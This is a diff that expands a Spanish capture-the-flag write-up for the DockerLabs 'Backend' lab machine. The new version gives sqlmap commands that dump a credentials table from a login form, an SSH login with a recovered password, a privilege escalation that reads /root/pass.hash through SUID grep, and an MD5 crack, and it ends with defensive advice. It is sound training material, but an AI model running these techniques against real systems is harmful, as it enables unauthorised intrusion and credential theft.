@@ -1,91 +1,238 @@
-# BACKEND — DockerLabs
+# Backend — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** 4bytes  
+**Fecha de creación:** 29/08/2024  
+**Técnicas:** Nmap · SQLmap · SSH · find SUID · ls+grep con SUID · CrackStation · Privesc (su root con hash crackeado)
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **BACKEND** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — login con SQL Injection](#2-enumeración-web--login-con-sql-injection)
+3. [SQLmap — extracción completa de la base de datos](#3-sqlmap--extracción-completa-de-la-base-de-datos)
+4. [Acceso SSH](#4-acceso-ssh)
+5. [Escalada de privilegios — SUID en ls y grep](#5-escalada-de-privilegios--suid-en-ls-y-grep)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar el laboratorio.
+```bash
+sudo bash auto_deploy.sh backend.tar
+```
 
-Haremos un escaneo rápido, con el parámetro -Pn por si no permite las
-conexiones ping el laboratorio y así ver los puertos abiertos.
+> IP asignada: `172.17.0.2`.
 
-Ahora que sabemos los puertos vamos a hacer un escaneo mas profundo,
-especificando cada puerto y buscando la versión con la que cuenta.
+Escaneo rápido:
 
-## 2. Enumeración
+```bash
+nmap -Pn 172.17.0.2
+```
 
-Vamos a ver que nos encontramos en el servidor apache.
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
 
-Al ver que tenemos un login.html vamos a intentar atacar a la base de datos del
-laboratorio con sqlmap.
-Con el parámetro:
--u: especificaremos la url del atacado.
---forms: Le dice a sqlmap que detecte y analice automáticamente los formularios
-HTML de la página para ver si alguno es vulnerable a inyecciones SQL.
---dbs: Si encuentra una vulnerabilidad, intentará listar las bases de datos
-disponibles en el servidor SQL comprometido.
---batch: Ejecuta el ataque en modo automático, sin hacer preguntas al usuario
-(usa las respuestas por defecto).
+Escaneo con versiones:
 
-Al ver que contamos con una base de datos llamada users vamos a ver que nos
-encontramos en ella.
--D: Especifica una base de datos concreta.
---tables: Una vez seleccionada la base de datos, le dices a sqlmap que te muestre
-todas las tablas contenidas dentro de esa base de datos.
+```bash
+nmap -p22,80 -sCV -Pn 172.17.0.2
+```
 
-## 3. Explotación
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.61 ((Debian))
+|_http-title: test page
+```
 
-Ahora al saber que contamos con la tabla usuarios, haremos lo mismo para seguir
-explorándola.
--T: Indicas la tabla específica dentro de esa base de datos.
---columns: Le pides a sqlmap que te muestre las columnas que tiene esa tabla
+---
 
-Vemos que cuentan con las siguientes columnas, vamos a seguir viendo que
-contienen
--C: Columnas específicas que quieres extraer.
---dump: Le pide a sqlmap que descargue el contenido de esas columnas.
+## 2. Enumeración web — login con SQL Injection
 
-Ahora que contamos con los usuarios y contraseñas, intentaremos conectarnos
-por ssh y podremos ver que nos permite conectarnos con el usuario pepe.
+Visitamos `http://172.17.0.2` — página "Under Development". El menú tiene una sección **Login** en `http://172.17.0.2/login.html` con campos username y password.
 
-## 4. Post-explotación
+Vamos directamente con SQLmap — detecta y explota inyecciones SQL automáticamente.
 
-Intentamos ejecutar sudo -l para escalar privilegios, pero vemos que no podemos
-ejecutar el comando.
+---
 
-find / Busca en todo el sistema (desde la raíz /)
--perm -4000 Busca archivos con el bit SUID activado (permiso especial 4000)
--user root
+## 3. SQLmap — extracción completa de la base de datos
 
-Que pertenezcan al usuario root
+**Paso 1 — Listar bases de datos:**
 
-## 5. Escalada de privilegios
+```bash
+sqlmap -u http://172.17.0.2/login.html --forms --dbs --batch
+```
 
-2>/dev/null Oculta errores (como "Permiso denegado") redirigiendo la salida de
-error a /dev/null
+```
+[INFO] the back-end DBMS is MySQL
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] users
+```
 
-Utilizaremos el binario ls para ver si tenemos algo en el directorio de root
+> 💡 `-u` especifica la URL. `--forms` detecta formularios automáticamente. `--dbs` lista bases de datos. `--batch` responde automáticamente a todas las preguntas.
 
-Y ahora al saber que contamos con un fichero .hash vamos a listarlo con grep.
-Buscaremos por gtfobins la forma correcta de hacerlo.
+**Paso 2 — Listar tablas de la base de datos `users`:**
+
+```bash
+sqlmap -u http://172.17.0.2/login.html --forms -D users --tables --batch
+```
+
+```
+Database: users
+[1 table]
++----------+
+| usuarios |
++----------+
+```
+
+**Paso 3 — Ver columnas de la tabla `usuarios`:**
+
+```bash
+sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns --batch
+```
+
+```
+Table: usuarios
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| password | varchar(255) |
+| username | varchar(255) |
++----------+--------------+
+```
+
+**Paso 4 — Extraer el contenido completo:**
+
+```bash
+sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios -C id,password,username --dump --batch
+```
+
+```
+Database: users
+Table: usuarios
+[3 entries]
++----+---------------+----------+
+| id | password      | username |
++----+---------------+----------+
+| 1  | $paco$123     | paco     |
+| 2  | P123pepe3456P | pepe     |
+| 3  | jjuuaann123   | juan     |
++----+---------------+----------+
+```
+
+Tres usuarios con sus contraseñas en texto claro.
+
+---
+
+## 4. Acceso SSH
+
+Probamos los tres usuarios. El que funciona es **pepe**:
+
+```bash
+ssh pepe@172.17.0.2
+```
+
+```
+pepe@172.17.0.2's password: P123pepe3456P
+pepe@377d8cb0b1e2:~$
+```
+
+---
+
+## 5. Escalada de privilegios — SUID en ls y grep
+
+Intentamos sudo:
+
+```bash
+pepe@377d8cb0b1e2:~$ sudo -l
+-bash: sudo: command not found
+```
+
+sudo no está disponible. Buscamos binarios con SUID (bit que permite ejecutar con los permisos del propietario):
+
+```bash
+pepe@377d8cb0b1e2:~$ find / -perm -4000 -user root 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/ls
+/usr/bin/grep
+```
+
+> 💡 **`/usr/bin/ls` y `/usr/bin/grep` con SUID** son inusuales. Con SUID, estos comandos se ejecutan con permisos de root, lo que nos permite leer ficheros normalmente inaccesibles.
+
+Usamos `ls` con SUID para listar el directorio de root:
+
+```bash
+pepe@377d8cb0b1e2:~$ /usr/bin/ls /root/
+pass.hash
+```
+
+Hay un fichero `pass.hash`. Usamos `grep` con SUID para leer su contenido (GTFObins):
+
+```bash
+pepe@377d8cb0b1e2:~$ LFILE=file_to_read
+pepe@377d8cb0b1e2:~$ /usr/bin/grep '' /root/pass.hash
+e43833c4c9d5ac444e16bb94715a75e4
+```
+
+Parece un hash MD5. Lo crackeamos en [crackstation.net](https://crackstation.net/):
+
+```
+Hash: e43833c4c9d5ac444e16bb94715a75e4
+Type: md5
+Result: spongebob34
+```
+
+Contraseña de root: **spongebob34**:
+
+```bash
+pepe@377d8cb0b1e2:~$ su root
+Password: spongebob34
+root@377d8cb0b1e2:/home/pepe# whoami
+root
+```
+
+✅ Somos **root**.
+
+---
 
 ## 6. Lección aprendida
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+| Vulnerabilidad | Dónde | Impacto |
+|----------------|-------|---------|
+| **SQL Injection en formulario login** | `login.html` | Extracción de toda la base de datos |
+| **Contraseñas en texto plano en DB** | Tabla `usuarios` | Acceso SSH directo |
+| **ls y grep con SUID** | `/usr/bin/ls`, `/usr/bin/grep` | Lectura de ficheros de root |
+| **Hash MD5 sin sal en pass.hash** | `/root/pass.hash` | Contraseña crackeada en segundos |
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+**Para defenderse:**
+- Usar consultas parametrizadas o prepared statements — eliminan SQL injection completamente.
+- Nunca almacenar contraseñas en texto plano. Usar bcrypt, scrypt o Argon2 con sal.
+- MD5 no es seguro para contraseñas — es reversible con diccionarios. CrackStation tiene millones de hashes.
+- Revisar regularmente binarios con SUID: `find / -perm -4000 2>/dev/null`. Quitar SUID de ls y grep — nunca deben tenerlo.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
 *¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
